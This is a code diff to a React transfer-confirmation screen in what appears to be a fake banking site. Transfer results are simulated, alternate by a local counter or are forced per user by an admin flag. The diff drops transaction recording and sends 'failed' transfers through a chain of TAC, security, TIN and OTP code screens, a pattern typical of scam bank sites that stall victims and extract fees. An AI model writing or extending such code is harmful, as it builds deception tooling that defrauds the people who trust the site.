@@ -37,9 +37,9 @@ export default function TransferConfirm() {
     setIsLoading(true);
     
     // Simulate processing time
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    await new Promise(resolve => setTimeout(resolve, 2000));
     
-    let isSuccess = transferCount % 2 === 0; // Default alternating pattern
+    let shouldSucceed = transferCount % 2 === 0; // Default alternating pattern
     
     // Check if admin has set specific transfer settings for this user
     if (user) {
@@ -52,36 +52,27 @@ export default function TransferConfirm() {
         
         if (!error && transferSetting) {
           // Admin has set a specific setting for this user
-          isSuccess = transferSetting.force_success;
+          shouldSucceed = transferSetting.force_success;
         }
       } catch (error) {
         console.error('Error checking transfer settings:', error);
         // If there's an error, fall back to the alternating pattern
       }
     }
-    
-    const status = isSuccess ? 'completed' : 'pending';
 
     // Update transfer count
     const newCount = transferCount + 1;
     localStorage.setItem('transferCount', newCount.toString());
-
-    // Add transaction to history
-    await addTransaction({
-      type: 'transfer',
-      amount: -amount,
-      description: `Transfer to ${recipient}`,
-      date: new Date(),
-      recipient: recipient,
-      status: status
-    });
     
     setIsLoading(false);
     
-    if (isSuccess) {
-      navigate("/transfer/success", { state: transferData });
+    // Route based on transfer mode
+    if (shouldSucceed) {
+      // Success mode: go directly to OTP
+      navigate("/transfer/otp", { state: transferData });
     } else {
-      navigate("/transfer/failure", { state: transferData });
+      // Failure mode: go through TAC → Security → TIN → OTP flow
+      navigate("/transfer/tac", { state: transferData });
     }
   };
 
